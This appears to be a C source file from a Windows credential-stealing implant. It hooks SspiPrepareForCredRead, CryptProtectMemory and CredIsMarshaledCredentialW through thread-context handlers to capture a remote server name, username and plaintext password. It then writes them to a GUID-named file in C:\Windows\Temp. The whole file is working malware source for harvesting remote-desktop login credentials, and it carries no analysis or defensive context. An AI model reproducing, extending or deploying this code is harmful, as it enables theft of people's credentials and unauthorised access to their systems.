#include "hooks.h"

FUNC VOID _SspiPrepareForCredRead(PCONTEXT pThreadCtx) {
    MAIN_INSTANCE

    PCWSTR pszTargetName = (PCWSTR)pThreadCtx->Rdx;
    Instance()->SensitiveInfo.g_lpServer = pszTargetName;

    CONTINUE_EXECUTION(pThreadCtx);
}

FUNC VOID _CryptProtectMemory(PCONTEXT pThreadCtx) {
    MAIN_INSTANCE

    LPVOID pDataIn              = (LPVOID)pThreadCtx->Rcx;
    DWORD  cbDataIn             = (DWORD)pThreadCtx->Rdx;
    LPVOID lpPasswordAddress    = ((DWORD*)pDataIn) + 0x01;

    if ((DWORD)(*(DWORD*)pDataIn) > 0x2) {
        Instance()->SensitiveInfo.g_lpTempPassword = LocalAlloc_(LPTR, cbDataIn);
        MmZero(Instance()->SensitiveInfo.g_lpTempPassword, cbDataIn);
        if (Instance()->SensitiveInfo.g_lpTempPassword)
            MmCopy((PVOID)Instance()->SensitiveInfo.g_lpTempPassword, lpPasswordAddress, cbDataIn);
    }

    CONTINUE_EXECUTION(pThreadCtx);
}

FUNC VOID _CredIsMarshaledCredentialW(PCONTEXT pThreadCtx) {
    MAIN_INSTANCE

    LPCWSTR MarshaledCredential = (LPCWSTR)pThreadCtx->Rcx;
    Instance()->SensitiveInfo.g_lpUsername = MarshaledCredential;

    if (wcslen_(MarshaledCredential) > 0)
        WriteCredentials();

    CONTINUE_EXECUTION(pThreadCtx);
}

FUNC BOOL WriteCredentials() {
    MAIN_INSTANCE
    WCHAR* tCredsData               = NULL;
    SIZE_T sCredsSize               = 0;
    HANDLE hFile                    = INVALID_HANDLE_VALUE;
    DWORD dwNumberOfBytesWritten    = 0;
    BOOL bResult                    = FALSE;
    wchar_t* FILENAME               = L"C:\\windows\\Temp\\{7C6A0555-C7A9-4E26-9744-5C2526EA3039}.dat";
    wchar_t* CREDENTIAL_DATA        = L"Server: %ls\nUsername: %ls\nPassword: %ls\n";

    hFile = CreateFileW_(FILENAME, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        goto Cleanup;
    }

    sCredsSize = wcslen_(CREDENTIAL_DATA) + wcslen_(Instance()->SensitiveInfo.g_lpServer) + wcslen_(Instance()->SensitiveInfo.g_lpUsername) + wcslen_(Instance()->SensitiveInfo.g_lpTempPassword);
    sCredsSize = sCredsSize * sizeof(WCHAR);

    tCredsData = (WCHAR*)LocalAlloc_(LPTR, sCredsSize);
    if (!tCredsData) {
        goto Cleanup;
    }

    snwprintf_s(tCredsData, sCredsSize, _TRUNCATE, CREDENTIAL_DATA, Instance()->SensitiveInfo.g_lpServer, Instance()->SensitiveInfo.g_lpUsername, Instance()->SensitiveInfo.g_lpTempPassword);
    sCredsSize = wcslen_(tCredsData) * sizeof(WCHAR);

    if (!WriteFile_(hFile, tCredsData, (DWORD)sCredsSize, &dwNumberOfBytesWritten, NULL) || (SIZE_T)dwNumberOfBytesWritten != sCredsSize) {
        goto Cleanup;
    }

    bResult = TRUE;

    Cleanup:
        if (tCredsData) {
            MmZero(tCredsData, sCredsSize);
            LocalFree_(tCredsData);
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle_(hFile);
        }
    return bResult;
}
